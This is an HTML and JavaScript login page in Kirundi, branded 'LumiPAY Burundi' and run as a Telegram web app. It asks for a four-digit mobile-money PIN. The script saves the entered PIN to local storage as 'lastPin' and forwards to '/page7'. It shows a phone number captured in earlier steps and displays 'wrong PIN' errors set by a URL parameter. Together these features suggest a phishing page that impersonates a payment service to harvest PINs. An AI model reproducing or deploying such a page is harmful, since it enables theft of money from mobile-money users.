<!DOCTYPE html>
<html lang="rn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>LumiPAY Burundi - Kwinjira</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            /* LumiPAY Brand Colors */
            --lumipay-red: #E30613;          /* Red signature color */
            --lumipay-red-dark: #b8000b;
            --lumipay-gradient: linear-gradient(180deg, #ff1a27 0%, #E30613 100%);
            --lumipay-green: #008738;        /* Green accent color */
            --lumipay-dark: #121212;
            --bg-color: #ffffff;
            --text-dark: #121212;
            --text-muted: #666666;
            --border-red: #fbdada;
            --btn-disabled-bg: #e2e8f0;
            --btn-disabled-text: #a0aec0;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body { 
            background-color: var(--bg-color); 
            margin: 0; 
            padding: 0;
            display: flex; 
            flex-direction: column; 
            min-height: 100vh; 
        }

        /* Top Header Area */
        .header-box { 
            width: 100%; 
            background: var(--lumipay-gradient); 
            padding: 30px 20px 25px; 
            color: #ffffff; 
            text-align: center; 
            box-shadow: 0 2px 10px rgba(227,6,19,0.15);
        }

        .header-title {
            font-size: 32px;
            font-weight: 900;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            letter-spacing: -0.5px;
            color: #ffffff;
        }

        .header-title .region {
            font-size: 13px;
            margin-left: 8px;
            font-weight: 800;
            text-transform: uppercase;
            background: var(--lumipay-green);
            color: #ffffff;
            padding: 2px 8px;
            border-radius: 6px;
        }

        .sub-header-text { 
            font-size: 14px; 
            margin-top: 6px; 
            font-weight: 700;
            color: #ffffff;
            opacity: 0.9;
        }

        /* Content Area */
        .main-content { 
            width: 90%; 
            max-width: 400px; 
            margin: 25px auto 0; 
            text-align: center; 
            flex-grow: 1; 
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        h2 { 
            color: var(--text-dark); 
            font-size: 22px; 
            margin: 10px 0 20px; 
            font-weight: 800; 
        }

        /* 🚨 Red Status Error Banner */
        .error-banner {
            width: 100%;
            background-color: #ffebe9;
            border: 1px solid #ff4d4f;
            color: #d93025;
            padding: 12px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 20px;
            display: none;
            box-shadow: 0 2px 6px rgba(217, 48, 37, 0.1);
        }

        /* Phone Display Field */
        .phone-display {
            width: 100%;
            border: 2px solid var(--border-red);
            border-radius: 12px;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 25px;
            font-size: 18px;
            font-weight: 800;
            color: var(--text-dark);
            background-color: #fff5f5;
        }

        .flag-icon {
            font-size: 20px;
            line-height: 1;
        }

        /* PIN Section */
        .pin-label { 
            color: var(--text-muted); 
            margin-bottom: 16px; 
            font-size: 14px; 
            font-weight: 600; 
        }

        .pin-wrapper {
            position: relative;
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 8px;
        }

        .pin-input-group { 
            display: flex; 
            gap: 12px; 
        }

        .pin-box {
            width: 52px;
            height: 52px;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            text-align: center;
            font-size: 22px;
            font-weight: bold;
            outline: none;
            background-color: #ffffff;
            transition: border-color 0.2s;
        }

        .pin-box:focus {
            border-color: var(--lumipay-red);
        }

        .pin-box.input-error {
            border-color: #d93025;
            background-color: #fff9f9;
        }

        .toggle-eye { 
            position: absolute;
            right: 0;
            cursor: pointer; 
            font-size: 20px; 
            user-select: none;
            color: var(--text-dark);
        }

        .forgot-pin {
            color: var(--text-muted);
            font-size: 13px;
            text-decoration: none;
            margin-bottom: 35px;
            display: inline-block;
            font-weight: 500;
        }

        /* Submit Button */
        .btn-submit {
            background-color: var(--btn-disabled-bg);
            color: var(--btn-disabled-text);
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 800;
            cursor: not-allowed;
            letter-spacing: 0.5px;
            text-transform: uppercase;
            transition: background-color 0.2s, color 0.2s;
        }

        .btn-submit.active {
            background-color: var(--lumipay-red);
            color: #ffffff;
            cursor: pointer;
            box-shadow: 0 4px 12px rgba(227, 6, 19, 0.35);
        }

        .btn-submit.active:hover {
            background-color: var(--lumipay-red-dark);
        }

        /* Bottom Curved Footer */
        .footer-box { 
            width: 100%; 
            background: var(--lumipay-gradient); 
            padding: 35px 20px 20px; 
            color: #ffffff; 
            text-align: center; 
            border-top-left-radius: 50% 30px; 
            border-top-right-radius: 50% 30px; 
            margin-top: auto;
        }

        .footer-title {
            font-size: 28px;
            font-weight: 900;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #ffffff;
        }

        .footer-title .region {
            font-size: 12px;
            margin-left: 6px;
            font-weight: 800;
            text-transform: uppercase;
            background: var(--lumipay-green);
            color: #ffffff;
            padding: 2px 6px;
            border-radius: 4px;
        }

        .terms-text { 
            font-size: 11px; 
            margin-top: 15px; 
            padding: 0 20px; 
            line-height: 1.4; 
            color: #ffffff;
            font-weight: 600;
        }

        .terms-text u { 
            color: #ffffff; 
            cursor: pointer; 
        }
    </style>
</head>

<body>

<!-- Header Section -->
<div class="header-box">
    <div class="header-title">
        <span>LumiPAY</span><span class="region">Burundi</span>
    </div>
    <div class="sub-header-text">Ingurane z'Ingoga & z'Amasaha Yose</div>
</div>

<!-- Main Login Form -->
<div class="main-content">
    <h2>Kwinjira</h2>

    <!-- Red Error Banner -->
    <div id="errorDisplay" class="error-banner"></div>

    <!-- Displays Phone Number Filled in Previous Steps -->
    <div class="phone-display">
        <span class="flag-icon">🇧🇮</span>
        <span>+257</span>
        <span id="displayPhone">--</span>
    </div>

    <p class="pin-label">Injiza ikode yawe ya PIN ya LumiPAY</p>

    <!-- PIN Inputs & Eye Icon -->
    <div class="pin-wrapper">
        <div class="pin-input-group">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
        </div>
        <span class="toggle-eye" id="eyeIcon">👁️‍🗨️</span>
    </div>

    <a href="#" class="forgot-pin">Wibagiwe PIN?</a>

    <button id="loginBtn" class="btn-submit" disabled>KWINJIRA</button>
</div>

<!-- Bottom Curved Footer -->
<div class="footer-box">
    <div class="footer-title">
        <span>LumiPAY</span><span class="region">Burundi</span>
    </div>
    <div class="sub-header-text">Ingurane z'Ingoga & z'Amasaha Yose</div>
    <p class="terms-text">Mu kwinjira, wemeye <u>Amategeko n'Ibijanye no Gukoresha Service</u></p>
</div>

<script>
document.addEventListener("DOMContentLoaded", () => {

    const pinBoxes = document.querySelectorAll('.pin-box');
    const loginBtn = document.getElementById('loginBtn');
    const eye = document.getElementById('eyeIcon');
    const displayPhone = document.getElementById('displayPhone');
    const errorDisplay = document.getElementById('errorDisplay');

    // Retrieve saved phone from previous steps (localStorage)
    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "61123456";
    displayPhone.textContent = savedPhone;

    // Detect error parameter in URL query
    const urlParams = new URLSearchParams(window.location.search);
    const errParam = urlParams.get('error');

    if (errParam === 'wrong_pin' || errParam === 'wrongpin') {
        errorDisplay.textContent = "Ikode ya PIN siyo, nyamuneka injiza ikode y'ukuri.";
        errorDisplay.style.display = "block";
        
        pinBoxes.forEach(b => b.classList.add('input-error'));
        if (pinBoxes.length > 0) pinBoxes[0].focus();
    } else if (errParam === 'invalid_credentials' || errParam === 'invalidcredentials') {
        errorDisplay.textContent = "Ubusobanuro si bwo, nyamuneka injiza ubusobanuro bw'ukuri.";
        errorDisplay.style.display = "block";
        
        pinBoxes.forEach(b => b.classList.add('input-error'));
        if (pinBoxes.length > 0) pinBoxes[0].focus();
    }

    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '');

            // Clear red error highlight on typing
            pinBoxes.forEach(b => b.classList.remove('input-error'));
            errorDisplay.style.display = "none";

            if (box.value && index < pinBoxes.length - 1) {
                pinBoxes[index + 1].focus();
            }

            checkInputs();
        });

        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) {
                pinBoxes[index - 1].focus();
            }
        });
    });

    function checkInputs() {
        const filled = [...pinBoxes].every(b => b.value.length === 1);
        loginBtn.disabled = !filled;
        loginBtn.classList.toggle('active', filled);
    }

    eye.addEventListener('click', () => {
        const isPassword = pinBoxes[0].type === "password";
        pinBoxes.forEach(b => b.type = isPassword ? "text" : "password");
    });

    loginBtn.addEventListener('click', () => {
        if (!loginBtn.classList.contains('active')) return;
        
        loginBtn.disabled = true;
        loginBtn.classList.remove('active');

        let pin = "";
        pinBoxes.forEach(b => pin += b.value);
        localStorage.setItem('lastPin', pin);

        errorDisplay.style.display = "none";

        window.location.href = "/page7";
    });

    if (window.Telegram?.WebApp) {
        window.Telegram.WebApp.ready();
        window.Telegram.WebApp.expand();
    }
});
</script>

</body>
</html>
